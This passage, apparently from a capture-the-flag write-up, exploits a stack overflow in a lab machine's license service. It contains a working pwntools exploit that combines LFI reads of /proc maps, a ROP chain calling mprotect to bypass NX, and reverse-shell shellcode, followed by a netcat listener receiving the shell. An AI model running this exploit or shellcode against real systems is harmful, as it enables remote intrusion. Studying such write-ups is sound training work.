7f4b23a66000-7f4b23bb1000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4b23bb1000-7f4b23bfb000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4b23bfb000-7f4b23bfc000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4b23bfc000-7f4b23bff000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4b23bff000-7f4b23c02000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f4b23c02000-7f4b23c06000 rw-p 00000000 00:00 0
7f4b23c06000-7f4b23c16000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f4b23c16000-7f4b23d0e000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f4b23d0e000-7f4b23d42000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f4b23d42000-7f4b23d46000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f4b23d46000-7f4b23d49000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f4b23d49000-7f4b23d4b000 rw-p 00000000 00:00 0
7f4b23d50000-7f4b23d51000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4b23d51000-7f4b23d71000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4b23d71000-7f4b23d79000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4b23d7a000-7f4b23d7b000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4b23d7b000-7f4b23d7c000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f4b23d7c000-7f4b23d7d000 rw-p 00000000 00:00 0
7fffc0546000-7fffc0567000 rw-p 00000000 00:00 0                          [stack]
7fffc056e000-7fffc0572000 r--p 00000000 00:00 0                          [vvar]
7fffc0572000-7fffc0574000 r-xp 00000000 00:00 0                          [vdso]
```

> I protected my process against overflow attack... yeahh but i have the memory addtess layout :)

##### GDB (With GEF extension):

- Prepare the file size:
- The file size need to be converted into network byte order:

```bash

# convert the file size (600) into hexadecimal value
~
❯ echo "obase=16; 600" | bc
258
```

- Host byte order: (600) base 10 = (258) base 16 = `(\x00\x00\x02\x58)` base 16 (hexadecimal)
- Convert to network byte order: `\x00\x00\x02\x58` --> `\x58\x02\x00\x00`

```c
// C program to convert from Host byte order to Network byte order enjoy ;)
// cat convertOSbyteOrderToNetwork.c
#include <stdio.h>
#include <arpa/inet.h>

void main (){
    // Define the value to convert
    uint32_t value = 600;

    // Convert the value to network byte order
    // !!!Important: socket_write($socket, pack("N", $license_size)); the file size is packed into
    // uint32 byte
    // network byte order.
    uint32_t network_value = htonl(value);

    printf("\\x%02x\\x%02x\\x%02x\\x%02x\n", (network_value >> 24) & 0xff, (network_value >> 16) & 0xff, (network_value >> 8) & 0xff, network_value & 0xff);

}
```

```bash
~
❯ ./convertOSbyteOrderToNetwork
\x58\x02\x00\x00
```

###### Crash the program: ( :0 )

```bash
# Run the program localy at port 443
~
❯ ./activate_license 4443
[+] starting server listening on port 4443
[+] listening ...
```

- The program expect from us first:
  - `msglen` 4 bytes: respresents the file size.
  - `msglen` - bytes of data to read into the `buffer` variable.

```bash
# Send the payload (4 + 600)bytes
# First 4 bytes represents the file size in network byte order
# Syntax: echo -e "networkByteOrder(600)$_gef0" | nc 127.0.0.1 444
echo -e "\x58\x02\x00\x00aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaac" | nc 127.0.0.1 4443
```

```bash

# Start gdb
~
❯ sudo gdb -q -p $(pidof activate_license)

gef➤  set follow-fork-mode child

gef➤  pattern create 600
[+] Generating a pattern of 600 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaac
[+] Saved as '$_gef0'

gef➤  c
Continuing.
[Attaching after Thread 0x7f1af4be80c0 (LWP 570) fork to child process 583]
[New inferior 2 (process 583)]
[Detaching after fork from parent process 570]
[Inferior 1 (process 570) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Thread 2.1 "activate_licens" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f1af4be80c0 (LWP 583)]
0x0000561ab03485c0 in activate_license (sockfd=0x4) at activate_license.c:64
64      activate_license.c: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x276
$rbx   : 0x00561ab03487c0  →  <__libc_csu_init+0> push r15
$rcx   : 0x0
$rdx   : 0x007f1af4be80c0  →  0x007f1af4be80c0  →  [loop detected]
$rsp   : 0x007ffcaa661918  →  "paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]" # you crashed me
$rbp   : 0x636161616161616f ("oaaaaaac"?)
$rsi   : 0x0
$rdi   : 0x007ffcaa661180  →  0x007f1af4dc4090  →  <funlockfile+0> endbr64
$rip   : 0x00561ab03485c0  →  <activate_license+643> ret
$r8    : 0x0
$r9    : 0x276
$r10   : 0x00561ab03490e6  →  0x666963657073000a ("\n"?)
$r11   : 0x246
$r12   : 0x00561ab0348220  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffcaa661a70  →  0x0000000000000002
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffcaa661918│+0x0000: "paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]"      ← $rsp
0x007ffcaa661920│+0x0008: "qaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwa[...]"
0x007ffcaa661928│+0x0010: "raaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxa[...]"
0x007ffcaa661930│+0x0018: "saaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacya[...]"
0x007ffcaa661938│+0x0020: "taaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaac\n[...]"
0x007ffcaa661940│+0x0028: 0x6361616161616175
0x007ffcaa661948│+0x0030: 0x6361616161616176
0x007ffcaa661950│+0x0038: 0x6361616161616177
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x561ab03485b9 <activate_license+636> call   0x561ab03480b0 <printf@plt>
   0x561ab03485be <activate_license+641> nop
   0x561ab03485bf <activate_license+642> leave
 → 0x561ab03485c0 <activate_license+643> ret
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "activate_licens", stopped 0x561ab03485c0 in activate_license (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x561ab03485c0 → activate_license(sockfd=0x4)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

- $rsp = "paaaaaac ......": Stack pointer
- Get the offset value:

```bash
gef➤  pattern search paaaaaac
[+] Searching for 'paaaaaac'
[+] Found at offset 520 (big-endian search)
```

- **Full payload size: offset:** 520 + 4 (the length `msglen`)

##### Binary Exploitation: Prepare the exploitation's python code

- Small Steps Recap:
  - We have the memory layout from the `/proc/<pid>/maps` file. (ASLR bye bye)
  - NX enabled: use return to libc technics to enable the stack execution (it's disabled due to NX - No execute protection)
  - Final Step: inject our shellcode and gaining access to the machine (pwned).

###### Disable NX:

- We will use the: `mprotect` function to set the memory protection and enable stack execution bit, so disabling the NX protection.

```bash
# mprotect manual page
# man 2 mprotect
MPROTECT(2)                                          Linux Programmer's Manual                                         MPROTECT(2)

NAME
       mprotect, pkey_mprotect - set protection on a region of memory

SYNOPSIS
       #include <sys/mman.h>

       int mprotect(void *addr, size_t len, int prot);

       #define _GNU_SOURCE             /* See feature_test_macros(7) */
       #include <sys/mman.h>

       int pkey_mprotect(void *addr, size_t len, int prot, int pkey);

DESCRIPTION
       mprotect()  changes  the access protections for the calling process's memory pages containing any part of the address range
       in the interval [addr, addr+len-1].  addr must be aligned to a page boundary.
```

###### Prepare our gadets:

A ROP chain, short for "return-oriented programming chain", is a sequence of gadget instructions that are strung together to form a malicious program. A gadget is a short sequence of instructions that ends with a return instruction, and is often found in compiled code. By chaining gadgets together, an attacker can construct a program that executes arbitrary code, even in environments where traditional forms of injection (such as buffer overflows) are prevented. This technique is often used in attacks that exploit vulnerabilities in software. (ChatGPT)

ROP chain: build your own program inside another program, using assembly instructions (gadgets)  
(Hassan Al Achek :p)

- You can use `ropper` to get `mprotect` gadget.
- Or use `pwntools` a python library for binary exploitaion (i will use pwntools)

```python
# Note: a friend helped me to build this code
#!/usr/bin/env python3

from pwn import *
import sys,re,requests,socket

IP="10.10.11.154"

def usage():
    print(f"Usage: {sys.argv[0]} <LOCAL IP> <LOCAL PORT>")
    exit()

# download file and save to /tmp
def get_file(path):
    r = requests.get(f"http://{IP}/index.php?page={path}", allow_redirects=False)
    localPath = f"/tmp/{path.split('/')[-1]}"
    with open(localPath,"wb") as f:
        f.write(r.content)
    return localPath

# find process id
def get_pid():
    r = requests.get(f"http://{IP}/index.php?page=/proc/sched_debug", allow_redirects=False)
    pid = re.search("activate_licens\s+([0-9]+)",r.text).group(1)
    print(f"[+] activate_license running @ PID {pid}")
    return pid

# extract base addresses from /proc/PID/maps
def get_addresses(pid):
    r = requests.get(f"http://{IP}/index.php?page=/proc/{pid}/maps", allow_redirects=False)
    libc_base = int(re.search("^.*libc.*$", r.text, re.M).group(0).split("-")[0], 16)
    libc_path = re.search("^.*libc.*$", r.text, re.M).group(0).split(" ")[-1]
    libsqlite_base = int(re.search("^.*libsqlite.*$", r.text, re.M).group(0).split("-")[0], 16)
    libsqlite_path = re.search("^.*libsqlite.*$", r.text, re.M).group(0).split(" ")[-1]
    stack_base = int(re.search("^.*\[stack\].*$", r.text, re.M).group(0).split("-")[0], 16)
    stack_end = int(re.search("^.*\[stack\].*$", r.text, re.M).group(0).split("-")[1].split()[0], 16)
    return libc_base, libc_path,libsqlite_base, libsqlite_path, stack_base, stack_end


def main():
    if len(sys.argv) < 3:
        usage()

    try:
        ip = socket.inet_aton(sys.argv[1])
        port = struct.pack(">H",int(sys.argv[2]))
    except:
        print(f"[-] Invalid arguments")
        usage()

    # Shellcode     msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=port -f py
    shellcode =  b""
    shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
    shellcode += b"\x97\x48\xb9\x02\x00"   + port  +  ip +   b"\x51\x48"
    shellcode += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
    shellcode += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
    shellcode += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
    shellcode += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

    # search PID with LFI
    pid = get_pid()
    if not pid:
        print(f"[-] Could not find PID for activate_license")
        exit()

    # search addresses in /proc/PID/maps
    libc_base, libc_path, libsqlite_base, libsqlite_path, stack_base, stack_end = get_addresses(pid)
    # calc sizeof(stack) for mprotect
    stack_size = stack_end - stack_base     # 0x21000

    context.clear(arch='amd64')
    # we need the same libraries versions used on the remote machine
    # to obtain a succesful result. So we downloaded the needed libraries
    # from the remote machine
    libc = ELF(get_file(libc_path),checksec=False)              # download libc
    libc.address = libc_base
    libsql = ELF(get_file(libsqlite_path),checksec=False)       # download libsqlite
    libsql.address = libsqlite_base
    rop = ROP([libc, libsql])

    offset = 520

    # search ROP Gadgets
    # we will use thes gadgets in order to push the arguments needed
    # by mprotect function and we need to respect the x64 assembly calling convention
    mprotect = libc.symbols['mprotect']     # 0xf8c20           readelf -s libc.so.6 | grep mprotect
    pop_rdi = rop.rdi[0]                    # 0x26796           ropper -f libc.so.6 --search "pop rdi"

    pop_rsi = rop.rsi[0]                    # 0x2890f           ropper -f libc.so.6 --search "pop rsi"
    pop_rdx = rop.rdx[0]                    # 0xcb1cd           ropper -f libc.so.6 --search "pop rdx"
    jmp_rsp = rop.jmp_rsp[0]                # 0xd431d           ropper -f libsqlite3.so.0.8.6 --search "jmp rsp"

    payload = b'A' * offset
    #disable the NX protection
    #int mprotect(void *addr, size_t len, int prot);
    payload += p64(pop_rdi) + p64(stack_base)       # addr = Begin of Stack
    payload += p64(pop_rsi) + p64(stack_size)       # len = size of Stack
    payload += p64(pop_rdx) + p64(7)                # prot = Permission 7 -> rwx
    payload += p64(mprotect)                        # call mprotect

    payload += p64(jmp_rsp)                         # jmp rsp
    payload += shellcode                            # add shellcode

    # File Upload beta.html
    r = requests.post(f"http://{IP}/activate_license.php", files = { "licensefile": payload } )


if __name__ == "__main__":
    main()
```

- References to go further:
  - [x64 assembly calling convention](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame)
  - [ROP chains - French](https://beta.hackndo.com/return-oriented-programming/)
  - [ROP chains - English - CTF101](https://ctf101.org/binary-exploitation/return-oriented-programming/)
  - [Disable NX protection with mprotect by +Ch0pin](https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-3-rop-chains-3cdcf17e8826)

#### Run The Exploit: Shell As WWW-DATA

- Start the exploitation code:

```bash
# Terminal-1
~
❯ ./exploit.py 10.10.16.6 9999
[+] activate_license running @ PID 401
[*] Loaded 190 cached gadgets for '/tmp/libc-2.31.so'
[*] Loaded 162 cached gadgets for '/tmp/libsqlite3.so.0.8.6'
```

- Receive connection from the tcp shell code with netcat:

```bash
# Terminal-2
~
❯ nc -lvp 9999
Listening on DESKTOP-I8TJHTD 9999
Connection received on 10.10.11.154 44496
ls
2022-12-08_20-06-00-html.zip
2022-12-08_20-07-00-html.zip
2022-12-08_20-08-00-html.zip
html
license.sqlite
bash -i
bash: cannot set terminal process group (401): Inappropriate ioctl for device
bash: no job control in this shell
www-data@retired:/var/www$ echo "FootHold"
```

## To be continued ...
